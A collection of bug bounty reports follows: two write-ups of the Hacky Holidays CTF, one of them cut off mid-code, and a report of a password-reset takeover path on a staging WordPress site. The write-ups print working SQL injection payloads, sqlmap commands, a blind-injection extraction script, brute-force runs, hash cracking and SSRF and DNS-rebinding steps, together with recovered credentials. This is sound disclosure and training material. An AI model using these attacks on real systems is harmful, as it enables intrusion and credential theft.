Using username=forum and password=6HgeAZ0qC9T6CQIqJpD on phpmyadmin
<image_8>
<image_9>
<image_10>
Challenge 9: Evil Quiz
Description: Just how evil are you? Take the quiz and see! Just don't go poking around the admin area!
I visited https://hackyholidays.h1ctf.com/evil-quiz and got a page asking name, I entered name as admin and got a page asking some questions, answered them and got this page.
<image_11>
Code 283 Bytes
1sqlmap identified the following injection point(s) with a total of 126 HTTP(s) requests:
2---
3Parameter: name (POST)
4Type: boolean-based blind
5Title: AND boolean-based blind - WHERE or HAVING clause
6Payload: name=admin' AND 2619=2619 AND 'gAdb'='gAdb
7---
8back-end DBMS: MySQL >= 8.0.0
So, it's time to get databases with command,
Code 452 Bytes
1sqlmap -r first.req --second-req second.req --force-ssl --not-string="There is 0" --dbs --batch --dbms=mysql
2
3sqlmap resumed the following injection point(s) from stored session:
4---
5Parameter: name (POST)
6	    Type: boolean-based blind
7	    Title: AND boolean-based blind - WHERE or HAVING clause
8            Payload: name=admin' AND 2619=2619 AND 'gAdb'='gAdb
9---
10back-end DBMS: MySQL >= 8.0.0
11available databases [2]:
12[*] information_schema
13[*] quiz
Next step is to get tables inside database quiz,
Code 485 Bytes
1sqlmap -r first.req --second-req second.req --force-ssl --not-string="There is 0" --no-cast --batch --dbms=mysql -D quiz --tables --time-sec 5
2
3sqlmap resumed the following injection point(s) from stored session:
4---
5Parameter: name (POST)
6    Type: boolean-based blind
7    Title: AND boolean-based blind - WHERE or HAVING clause
8    Payload: name=admin' AND 2619=2619 AND 'gAdb'='gAdb
9---
10back-end DBMS: MySQL >= 8.0.0
11Database: quiz
12[2 tables]
13+-------+
14| admin |
15| quiz  |
16+-------+
--no-cast option is used as suggested by sqlmap for good results.
So, last step is to get contents of admin table,
Code 672 Bytes
1sqlmap -r first.req --second-req second.req --force-ssl --not-string="There is 0" --no-cast --batch --dbms=mysql -D quiz -T admin --dump username,password --time-sec 5
2
3sqlmap resumed the following injection point(s) from stored session:
4---
5Parameter: name (POST)
6    Type: boolean-based blind
7    Title: AND boolean-based blind - WHERE or HAVING clause
8    Payload: name=admin' AND 2619=2619 AND 'gAdb'='gAdb
9---
10back-end DBMS: MySQL >= 8.0.0
11Database: quiz
12Table: admin
13[1 entry]
14+----+-------------------+----------+
15| id | password          | username |
16+----+-------------------+----------+
17| 1  | S3creT_p4ssw0rd-$ | admin    |
18+----+-------------------+----------+
I also wrote a tamper script tamperscript.py (F1132485) for sqlmap to perform threaded requests which is attached, thanks to this blog post.
I logged in to admin and got the flag.
Challenge 10: Signup Manager
Description: You've made it this far! The grinch is recruiting for his army to ruin the holidays but they're very picky on who they let in!
On browsing https://hackyholidays.h1ctf.com/signup-manager/, I got a page with bunch of input fields. First thing I checked is source code of page by pressing ctrl+U and got a interesting comment.
<!-- See README.md for assistance -->
So I browsed https://hackyholidays.h1ctf.com/signup-manager/README.md and got the file with this contents.
Code 703 Bytes
1# SignUp Manager
2SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.
3### How to Install
41) Create a directory that you wish SignUp Manager to be installed into
52) Move signupmanager.zip into the new directory and unzip it.
63) For security move users.txt into a directory that cannot be read from website visitors
74) Update index.php with the location of your users.txt file
85) Edit the user and admin php files to display your hidden content
96) You can make anyone an admin by changing the last character in the users.txt file to a Y
107) Default login is admin / password
It is telling that the file signupmanager.zip to be placed into the directory where it is being installed, so I visited https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip and got the file.
There were 5 files in it index.php, admin.php, user.php, signup.php and README.md. The whole logic is is index.php page.
The index.php do the following things.
For signup, it accepts 5 parameters username, password, age, firstname and lastname.
For username, firstname and lastname it removes all special characters using regular expression and for firstname and lastname it gets first 15 characters using substr function and it calculates md5 of password.
It then checks if age is numeric or not and also if length is greater than 3.
It passes all variables into addUser function.
The addUser function takes all values and adds padding to all variables (15 for username, firstname and lastname and 3 for age), generates random md5, it then appends all values into one line and adds ‘N’ as end, it then calculates first 113 characters using substr function and writes it to users.txt file and returns random md5 as cookie.
The function buildUsers reads file users.txt, converts it into object and returns the object.
From reading README.md, if ‘Y’ is at end of line, I can become admin. So, I have to somehow change the last character to ‘Y’.
Here is a small snippet that checks for a valid age.
Code 257 Bytes
1if (!is_numeric($_POST["age"])) {
2                $errors[] = 'Age entered is invalid';
3            }
4            if (strlen($_POST["age"]) > 3) {
5                $errors[] = 'Age entered is too long';
6            }
7            $age = intval($_POST["age"]);
It checks using is_numeric php function. On documentation page of this function here we see in example that it also accepts ‘e’ as a valid number. After it checks if length is greater than 3 and then uses intval function to calculate integer value of a variable. So if we give number “2e3, it will pass the is_numeric and strlen check and final value after inval function will be 2000, it adds number of zeros after e. So, we can use this to become admin. I sent a request with POST data,
Code 95 Bytes
1action=signup&username=random&password=random&age=2E3&firstname=random&lastname=randomlastnameY
For better understanding, I ran it locally and got this result.
Code 244 Bytes
1┌─[shubham@parrot]─[~/hackyholidays/signupmanager]
2└──╼ $cat users.txt 
3
4random#########7ddf32e17a6ac5ce04a8ecbf782ca5091c4041d8428d6304d401d09f09117c2b2000random#########randomlastnameY
5┌─[shubham@parrot]─[~/hackyholidays/signupmanager]
6└──╼ $
<image_12>
Challenge 11: Grinch Recon
This is where things started to become tricky.
I browsed https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59 which I got from previous challenge and I was presented with the page
<image_13>
On clicking any links on home page, we get a page with url https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k with changed values of hash. I tried injecting it with jdh34k' but got 404 but when I injected it with jdh34k' and 1=1 -- - and I got page pack. BOOM!!! SQL injection.
I used sqlmap to get all information from databases but didn't get any information that can help, so dead end for me.
Whenever I get a dead end, I go one step back so I went back to page which was showing images and checked the source of page and got some interesting thing.
Code 961 Bytes
1<div class="col-md-4">
2                        <img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9">
3                    </div>
4
5                    <div class="col-md-4">
6                        <img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzliODgxYWY4YjMyZmYwN2Y2ZGFhZGE5NWZmNzBkYzNhLmpwZyIsImF1dGgiOiJlOTM0ZjQ0MDdhOWRmOWZkMjcyY2RiOWMzOTdmNjczZiJ9">
7                    </div>
8
9                    <div class="col-md-4">
10                        <img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzEzZDc0NTU0YzMwZTEwNjk3MTRhNWE5ZWRkYThjOTRkLmpwZyIsImF1dGgiOiI5NGZiMzk4ZDc4YjM2ZTdjMDc5ZTc1NjBjZTlkZjcyMSJ9">
11                    </div>
12 </div>
I base64 decoded one of the value and got test as {"image":"r3c0n_server_4fdk59\/uploads\/13d74554c30e1069714a5a9edda8c94d.jpg","auth":"94fb398d78b36e7c079e7560ce9df721"}
I tried accessing the page directly using https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/uploads/13d74554c30e1069714a5a9edda8c94d.jpg but got response as Image cannot be viewed directly.
<image_14>
I already had SQL injection in hash parameter where we control hash parameter from query.
Thanks to the author for clearing the doubts here, here is flow
The first query is just “select * from albums where hash = x “
Something like
Code 61 Bytes
1$hash = "select * from albums where hash=".$_GET['hash'].";";
So $hash is the object which contains rows returned by query which contain 3 columns id, hash and name.
In the data returned one of the columns id is called
Which is used for “select * from photos where album_id = id “ like
Code 65 Bytes
1$images = "select * from photos where album_id=".$hash['id'].";";
$images is the object containing names of images, so server takes names of images and creates a JSON object with image and auth parameters where in image parameter it adds image name to r3c0n_server_4fdk59\/uploads\/imagename and generates auth token for this and converts it to base64.
So, the goal here is to control name of image to achieve the SSRF.
Here nested SQL injection comes in play. The results returned by first query where we can inject contains 3 columns id, hash and name. Here we have inject control the id which is easy to control using union query like abc union select 1,1,'hash' -- -` but it is not enough, we have to control the data returned by next query, thanks to object property in php, we can can inject into next query by using union injection inside id
Code 70 Bytes
1abc' UNION SELECT "2' UNION SELECT 1,1,'datawecontrol' -- -",'1',1-- -
First we are injecting inside hash parameter and creating an object which is an union injection.
Using above query I got result as,
Code 617 Bytes
1<div class="col-md-4">
2                        <img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzMyZmViYjE5NTcyYjEyNDM1YTZhMzkwYzA4ZThkM2RhLmpwZyIsImF1dGgiOiI3NmJhMDYxZDM1NmM2MjY0YTYwMDUyMTZlMTc3NmJhNiJ9">
3                    </div>
4
5                
6                    <div class="col-md-4">
7                        <img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RhdGF3ZWNvbnRyb2wiLCJhdXRoIjoiYWNmNzRkMTMzMmIxYTk3MjRhNzUyOTFmMjU2ZTY1ZDkifQ==">
8                    </div>
Base64 decoded 2nd value and got the thing we control
Code 97 Bytes
1{"image":"r3c0n_server_4fdk59\/uploads\/datawecontrol","auth":"acf74d1332b1a9724a75291f256e65d9"}
<image_15>
So created a python script which is attached to do all these, thanks again to MrKn0w1t4ll here
endpoint.py (F1132643)
Got 2 valid endpoints( Filtering based on response code if 404 then invalid else valid)
Query used abc' UNION SELECT "2' UNION SELECT 1,1,'../api/endpoint' -- -",'1',1-- -
Code 136 Bytes
1─[shubham@parrot]─[~/hackyholidays/reconserver]
2└──╼ $python3 endpoint.py 
3[+] Valid endpoint found: ping
4[+] Valid endpoint found: user
Endpoint user seems interesting tried to find valid parameters and got 2 valid parameters.(Filtering based on response code if 400 then invalid parameter else valid parameter)
Query used abc' UNION SELECT "2' UNION SELECT 1,1,'../api/user?parameter=abc' -- -",'1',1-- -
Code 146 Bytes
1─[shubham@parrot]─[~/hackyholidays/reconserver]
2└──╼ $python3 endpoint.py 
3[+] Valid parameter found: password
4[+] Valid parameter found: username
Damn, another SQL like query injection in username and password parameters.
We can extract bit by bit by injecting character% and filtering results based on response codes if 204 then no data found and does not start with the specified character and if response as invalid content type detected then some data is found and it starts with specified character.
Using query abc' UNION SELECT "2' UNION SELECT 1,1,'../api/user?username=character%' -- -",'1',1-- -
So I started checking each character from python's string.printable string one by one and got 1st chacater at g and kept repeating like g%, gr%, gri%, ...
Got valid username as grinchadmin and did same for passwor,
Using query abc' UNION SELECT "2' UNION SELECT 1,1,'../api/user?password=character%' -- -",'1',1-- -
Got password as s4ant4sucks, logged in on attack-box and got the flag.
Challenge 12: Grinch Network Attack Server
<image_16>
Code 1.15 KiB
1<tr>
2                        <th>Target</th>
3                        <th class="text-center">Action</th>
4                    </tr>
5                                        <tr>
6                        <td>203.0.113.33</td>
7                        <td class="text-center"><a class="btn btn-danger" href="/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==" target="_blank">Attack</a></td>
8                    </tr>
9                                        <tr>
10                        <td>203.0.113.53</td>
11                        <td class="text-center"><a class="btn btn-danger" href="/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuNTMiLCJoYXNoIjoiMjgxNGY5YzczMTFhODJmMWI4MjI1ODUwMzlmNjI2MDcifQ==" target="_blank">Attack</a></td>
12                    </tr>
13                                        <tr>
14                        <td>203.0.113.213</td>
15                        <td class="text-center"><a class="btn btn-danger" href="/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMjEzIiwiaGFzaCI6IjVhYTliNWE0OTdlMzkxOGMwZTE5MDBiMmEyMjI4YzM4In0=" target="_blank">Attack</a></td>
16                    </tr>
On decoding base64 one of the payload got {"target":"203.0.113.213","hash":"5aa9b5a497e3918c0e1900b2a2228c38"}
So same as previous challenge? but do not have any obvious thing that we control, so I started cracking the salt of hash( Using host computer for cracking, we should never use VM for cracking)
Code 671 Bytes
1PS C:\Users\Shubham Zodape\Downloads\hashcat-6.1.1> [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMjEzIiwiaGFzaCI6IjVhYTliNWE0OTdlMzkxOGMwZTE5MDBiMmEyMjI4YzM4In0="))
2{"target":"203.0.113.213","hash":"5aa9b5a497e3918c0e1900b2a2228c38"}
3PS C:\Users\Shubham Zodape\Downloads\hashcat-6.1.1> echo "5aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213" > ip.hash
4PS C:\Users\Shubham Zodape\Downloads\hashcat-6.1.1> gc ip.hash
55aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213
6PS C:\Users\Shubham Zodape\Downloads\hashcat-6.1.1>.\hashcat.exe -m 10 .\ip.hash .\rockyou.txt
75aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213:mrgrinch463
Got the salt as mrgrinch463, the hash is calculated by md5(salt+ip).
So we can create payload for any ip, here is script I created genpayload.py (F1132732) to generate the payload
I created payload for ip 127.0.0.1 ( I have to take down the grinch) and sent it in payload parameter.
Code 291 Bytes
1┌─[✗]─[shubham@parrot]─[~/hackyholidays/attackbox]
2└──╼ $python3 genpayload.py 
3Enter IP Address: 127.0.0.1
4Raw Payload: {"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"}
5Encoded Payload: eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==
<image_17>
Here I used https://github.com/taviso/rbndr to perform DNS-rebinding, using 7f000001.c0a80001.rbndr.us to create payload
Code 265 Bytes
1Enter IP Address: 7f000001.c0a80001.rbndr.us
2Raw Payload: {"target":"7f000001.c0a80001.rbndr.us","hash":"de9d82d4ae9a61660701e7e1844ea643"}
3Encoded Payload: eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsImhhc2giOiJkZTlkODJkNGFlOWE2MTY2MDcwMWU3ZTE4NDRlYTY0MyJ9
<image_18>
Thank you hackerone for this great event, the challenges were really great. I had a lot of fun solving them and I learned many new things.
Impact
Anyone can take down Grinch.



==================================================

Report File: 1067547.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Information Disclosure

Contents:

Summary:
Dear Team,
Today when I trying to find bugs on happy tools I have found 2 domains below for staging environment
https://maildev.happytools.dev
https:// api.happytools.dev
Two websites above ssl certificate was expired. But you can adjust your date-time to 02/02/2020 or before that time to access those sites normally
Platform(s) Affected:
https:// api.happytools.dev
Steps To Reproduce:
https://api.happytools.dev/wp-login.php?action=lostpassword and forgot password for user api
Go to https://maildev.happytools.dev to get reset password link and set new password for user api (I did not try to do that)
After changing password for user api, we can control wordpress cms and may upload plugins/themes contain backdoor or harmful scripts to this server
Supporting Material/References:
Some screen shots PoC
<image_0>
<image_1>
████████
Impact
Takeover wordpress site api.happytools.dev



==================================================

Report File: 1067835.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- None

Contents:

On December 12th, 2020, the CTF became live and the scope that we are allowed to attack was
Code 45 Bytes
1In Scope Domain - **hackyholidays.h1ctf.com**
Our main motive was to infiltrate his network and take him down. The challenges appeared one by one till 24th of December. Here we will be going through all the steps taken to obtain all the flags.
TL;DR
<image_0>
Detailed
Flag 1 - KEEP OUT
It all started with hitting hackyholidays.h1ctf.com, we are greeted with a KEEP OUT sign. And we are not going to listen to the Grinch. So, on a little bit of enumeration found robots.txt, which often contains some endpoints that can be utilize for further reconnaissance.
In the robots.txt, the first flag was found with a Disallow entry of /s3cr3t-ar3a, which will be available for next day.
Code 35 Bytes
1hackyholidays.h1ctf.com/s3cr3t-ar3a
Flag 2 - Page Moved
On the second day, when we hit the /s3cr3t-ar3a endpoint, it shows that the page is moved with a message left behind that "If you're allowed access you'll know where to look for the proper page!" It means that we have to find the new endpoint for where this page has moved to.
This flag was bit tricky(at least for me). Upon checking the source code from View Page Source options and did other directory brute forcing, etc. but there was no where to go.
Tinkering around the application bit more, when inspected the web page using DOM, it revealed some interesting information (flag and endpoint) that was not available in the source code.
<image_1>
But it was unsure to me, how it happened, so upon doing a bit research, came to know that the "View Source" simply shows the HTML as it was delivered from the web server to our browser, where as, "Inspect Element" shows the current state of the DOM tree, after HTML error correction, HTML normalization and DOM manipulation by JS.
And it all made sense about this flag. I really loved this one. Now we have /apps endpoint, where Grinch is going to post all other challenges for us to solve.
Flag 3 - People Rater
Objective - Find record that does not belong there.
<image_2>
When each button is clicked, an ID is being passed in GET request, as following
Code 39 Bytes
1GET /people-rater/entry?id=eyJpZCI6Mn0=
The ID is in base64 encoded form of {"id":<number>}. For example, in the above request the value for ?id= results in {"id":2}. The fun part is the list starts with id = 2. Passing the base64 encoded string of value {"id":1} it returns a different rating(which was good) and a flag.
Code 210 Bytes
1$ curl https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0= 
2{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}
This vulnerability is an example of IDOR - Insecure Direct Object Reference, the get parameter passes a value that can be altered and can access other details, which was supposed to be hidden in this case.
Flag 4 - Swag Shop
Objective - Find Grinch's Personal Details from the online shop for Grinch Merch.
Upon inspecting the source code, a JS code snippet was found, which revealed another endpoint, called /api and upon fuzzing that endpoint, we found
Code 305 Bytes
1$ ffuf -u https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ -w common.txt -mc all -fc 404
2...
3sessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]
4stock                   [Status: 200, Size: 167, Words: 8, Lines: 1]
5user                    [Status: 400, Size: 35, Words: 3, Lines: 1]
6...
In the /api/sessions we found 8 base64 encoded session and Grinch has messed up with all of it but one, which when decoded yield
Code 539 Bytes
1eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==
2
3{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}
Now, we have value for user which looks like a uuid and a cookie. At the first sight, the cookie looked interesting, so after playing with it for some time and reaching no where. It was better to take another approach.
Another interesting endpoint was /user which receives GET request and after some guessing, when passed the value for uuid parameter with the /api/user endpoint it give the information of Grinch's account and the flag.
<image_3>
Another IDOR vulnerability, exploiting which, the attacker was able to access the details directly with the UUID.
Flag 5 - Secure Login
Objective: Try and find a way past the login page to get to the secret area.
We were presented with a login form, which in it's error response says if the username/password is incorrect. So we can use it to filter the response and fuzz for username and password one at a time.
Fuzzing for username:
Code 263 Bytes
1$ ffuf -u https://hackyholidays.h1ctf.com/secure-login -w  names.txt -d "username=FUZZ&password=something" -fr "Invalid Username" -H "Content-Type: application/x-www-form-urlencoded"
2...
3access                  [Status: 200, Size: 1724, Words: 464, Lines: 37]
4...
Fuzzing for password:
Code 283 Bytes
1$ ffuf -u https://hackyholidays.h1ctf.com/secure-login -w  10-million-password-list-top-10000.txt -d "username=access&password=FUZZ" -fr "Invalid Password" -H "Content-Type: application/x-www-form-urlencoded"
2...
3computer                [Status: 302, Size: 0, Words: 1, Lines: 1]
4...
<image_4>
Inspecting at the cookie (securelogin), we find it's base64 encoded and upon decoding it, we find it contains an attribute called admin and it was set as false. So, tried to craft the securelogin cookie in such a way that it contains the user's cookie attribute untouched and change the admin attribute is set to true.
<image_5>
<image_6>
We now have a zip to work on and it's password protected, we can use fcrackzip to bruteforce the password, and on doing that we found the password and retrieved the flag.
Code 127 Bytes
1$ fcrackzip -u my_secure_files_not_for_you.zip -D -p 10-million-password-list-top-10000.txt
2
3PASSWORD FOUND!!!!: pw == hahahaha
fcrackzip here is being used with flags,
-u → use unzip to remove wrong password
-D → use a dictionary for bruteforcing
-p → to use string as initial password/file
<image_7>
And it's day 5 and Grinch is still trying it's best to ruin the Christmas.
Flag 6 - My Diary
Objective - Find out Grinch's upcoming event.
The application seem to load and render files from the GET parameter. So, tried fuzzing the GET parameter,
Code 167 Bytes
1$ ffuf -u https://hackyholidays.h1ctf.com/my-diary/?template=FUZZ -w common.txt -mc 200
2...
3index.php               [Status: 200, Size: 689, Words: 126, Lines: 22]
4...
When trying to render the index.php it gives blank page but the Words: 126, Lines: 22 that ffuf gave us was contradicting the fact that the page was blank so upon inspecting the source of the page, it gives out PHP code.
Code 689 Bytes
1<?php
2if( isset($_GET["template"])  ){
3    $page = $_GET["template"];
4    //remove non allowed characters
5    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
6    //protect admin.php from being read
7    $page = str_replace("admin.php","",$page);
8    //I've changed the admin file to secretadmin.php for more security!
9    $page = str_replace("secretadmin.php","",$page);
10    //check file exists
11    if( file_exists($page) ){
12       echo file_get_contents($page);
13    }else{
14        //redirect to home
15        header("Location: /my-diary/?template=entries.html");
16        exit();
17    }
18}else{
19    //redirect to home
20    header("Location: /my-diary/?template=entries.html");
21    exit();
22}
Code Snippet demonstrated how templates are being rendered, and how to access the admin panel.
There is some validation on the value received from the template parameter. So, let's break it down-
It only accepts characters - UPPER CASE and lower case alphabets, number from 0 to 9, and a dot(.)
It nulls out the value, if the value entered is - admin.php or secretadmin.php
We have to get access to the secretadmin.php and if we try to directly access it, it gives a message
Code 46 Bytes
1You cannot view this page from your IP Address
So we have to pass it through the template parameter, and in order to bypass the validation we have to craft a payload that can help us by pass all the checks.
<image_8>
And passing this in the template, gives access to the secret admin panel.
Code 90 Bytes
1https://hackyholidays.h1ctf.com/my-diary/?template=secretasecretadadmin.phpmin.phpdmin.php
<image_9>
This was a case of weak input validation. And we can see Grinch's unlisted upcoming event and it seems real bad!!
Flag 7 - Hate Mail Generator
Objective - Find the hidden flag, as Grinch sends his mail by email campaigns.
We have been given a campaign manager, where previous campaigns are listed and option to create a new one is also available.
We have a listed campaign, which contains some data and we cannot create one because "you've run out of credits". But from this listed campaign we get to know how to include pre-made templates and other html tags are also allowed.
<image_10>
So, there must be other templates that can be incorporated, and on performing directory bruteforcing, it yields a directory that lists different templates.
Code 229 Bytes
1$ ffuf -u https://hackyholidays.h1ctf.com/hate-mail-generator/FUZZ -w  common.txt
2...
3new                     [Status: 200, Size: 2494, Words: 440, Lines: 49]
4templates               [Status: 302, Size: 0, Words: 1, Lines: 1]
5...
<image_11>
We found that there is this admin header, which cannot be accessed directly but maybe we can use it to incorporate as a template.
Upon trying to create a new campaign, we are not allowed to create it but are allowed to preview it...and upon previewing we get a name, that we have not input.
<image_12>
And it outputs the following result,
Code 16 Bytes
1Hello Alice ....
Upon inspecting the source code, it was evident that "Alice" is coming from a hidden input field. So, we have a bunch of input field and injecting templates in the Name, Subject and Markup Fields does not result in success.
We can try to inject 38dhs_admins_only_header.html in other field that are being rendered on the page, and in this case, the value from the hidden field is.
Upon trying to inject the template in the name attribute - {{template: 38dhs_admins_only_header.html}} and submitting the form, gives us the flag!!
<image_13>
Flag 8 - Forum
Objective - Get access to admin section of the forum.
Started off with directory bruteforcing gave some things to play with,
Code 408 Bytes
1$ ffuf -u https://hackyholidays.h1ctf.com/forum/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc all -fc 404
2...
32                       [Status: 200, Size: 1885, Words: 512, Lines: 58]
41                       [Status: 200, Size: 2249, Words: 788, Lines: 64]
5login                   [Status: 200, Size: 1569, Words: 396, Lines: 34]
6phpmyadmin              [Status: 200, Size: 8880, Words: 956, Lines: 79]
7...
After trying out different things on the application (that too of no use), went down the recon path. Searching for a bit, came across a commit that looked interesting, on Adam Langley's GitHub.
<image_14>
And we have a code base, to look into. Enumerating the GitHub repository, we come across a commit that was for a small fix and that was to remove the hardcoded credentials, that was committed earlier.
<image_15>
It's the leaked credentials for database, using which we can log in to phpmyadmin to get access to the database, where the the credentials were stored.
<image_16>
<image_17>
And using the credentials (grinch:BahHumbug), we were able to login and check out the "Secret Plans" which gave us the flag and information about Grinch having Santa's Location!!
<image_18>
Flag 9 - Evil Quiz
Objective - Find Flag and Have access to the admin area! ;)
This was a quiz application to "Check how evil are you?" In the first page, it takes name as input then asks a few questions and gives rating (Out of 3) and number of people having the same name.
<image_19>
Now, this looks fishy. If I had to guess, the logic behind showing the "people with same name" can be,
Code 54 Bytes
1select count(*) from table where name like "whatever";
And, yes after tinkering with it for a few moments, confirmed my doubt about SQLi - Boolean based SQLi.
Identification- For a particular name, suppose there are 30 members and when I do something to break the syntax the number of members drops to zero (shows error).
Code 32 Bytes
1name=admin'  # breaks the syntax
Upon doing some manual SQLi and guess work, got hold of a few things like
admin' AND (length(database())) = 4-- - Gives the length of database name - 4 characters
admin' AND (ascii(substr((select database()),1,1))) = 113 -- - Gives that the first character is 'q' (113)
Guess Work - 4 characters and starts with 'q' - seems like quiz and we have our database name. And now using this we can try to figure out name of the table that is inside the database.
admin' AND (length((select table_name from information_schema.tables where table_schema='quiz' limit 0,1))) = 5 -- - Gives the length of the table name - 5 characters
admin' AND (ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="quiz" LIMIT 0,1),1,1))) = 97-- - Gives that the first character is 'a'
Guess Work - 5 characters and starts with 'a' - seems like admin and we have out table name.
Similarly, we can do to find the column names and stuff but we can't keep on going this forever, there are two ways to approach this,
We can use automated tool like sqlmap and
import requests
import string
All the printable characters
chars = string.printable
# Maintaining Session State
session = requests.Session()
final = ""
ct = 0
print("[*] Finding Password ... ")
password = 1
while ct < 100 :
ct = 1
for char in chars:
sqli="1' or (ascii(substr((select password from admin ) ,{},1))) ={} -- -".format(str(password),ord(char))
post_parameters = {"name":str(sqli)}
headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Edg/84.0.522.63","Content-Type":"application/x-www-form-urlencoded"}
cookies = {"session":"206979a74800a0190f1f04c10db5ca8c"}
post_response = session.post("https://hackyholidays.h1ctf.com/evil-quiz", data=post_parameters, headers=headers, cookies=cookies)
get_response = session.get("https://hackyholidays.h1ctf.com/evil-quiz/score", headers=headers, cookies=cookies)
# print(char)
if 'There is 0 other player(s)' not in get_response.text:
final += str(char)
print(final)
break
ct += 1
password += 1
print('[+]Found: '.format(str(final)))
Code 867 Bytes
1
2I took taking the lazy way - `SQLMap`. Setting up `SQLMap` to use post data and redirection URL as well, with other headers and fact checking `--not-string` flag, along with the database and table specified, that we found earlier.
3
4Without following redirects and merging the cookie, here we successfully ran the `sqlmap` that yield us the credentials.
5
6```shell
7$ sqlmap -u 'https://hackyholidays.h1ctf.com/evil-quiz' --data 'name=cardinal' --second-url 'https://hackyholidays.h1ctf.com/evil-quiz/score' --random-agent --not-string 'There is 0 other player' --technique=B --level=3 --risk=3 --cookie 'session=206979a74800a0190f1f04c10db5ca8c'  -D quiz -T admin --dump
8...
9+----+-------------------+----------+
10| id | password          | username |
11+----+-------------------+----------+
12| 1  | S3creT_p4ssw0rd-$ | admin    |
13+----+-------------------+----------+
14...
Using which we can log into the admin zone to obtain the flag.
Flag 10 - Signup Manager
Objective - Try to get into the Grinch's army (as an insider maybe xD)
We have two forms - signup and login. And we have to leverage them to become the admin. Checking out the "View Source", it has a comment at the very beginning,
Code 41 Bytes
1<!-- See README.md for assistance -->
2...
So, upon visiting https://hackyholidays.h1ctf.com/signup-manager/README.md, gave us the README.md file, which had other instructions mentioned to install SignUp Manager
Code 712 Bytes
1# SignUp Manager
2
3SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.
4
5### How to Install
6
71) Create a directory that you wish SignUp Manager to be installed into
8
92) Move signupmanager.zip into the new directory and unzip it.
10
113) For security move users.txt into a directory that cannot be read from website visitors
12
134) Update index.php with the location of your users.txt file
14
155) Edit the user and admin php files to display your hidden content
16
176) You can make anyone an admin by changing the last character in the users.txt file to a Y
18
197) Default login is admin / password
It mentioned one more file - signupmanager.zip which can be downloaded the same way as README.md by visiting - https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip
Code 97 Bytes
1SignUpManager
2├── admin.php
3├── index.php
4├── README.md
5├── signup.php
6├── user.php
7└── users.txt
index.php contained all the code for user creation and validation.
This was fun and easy. We have to perform source code review to find out the vulnerability that can help us become admin user.
All the components are properly validated and sanitized, except one - age. It was accepting any input from the browser.
There is only one condition check that is being performed is that the length of the value of age cannot be more than three characters.
Relevant Code Snippets [index.php]
Code 141 Bytes
1...
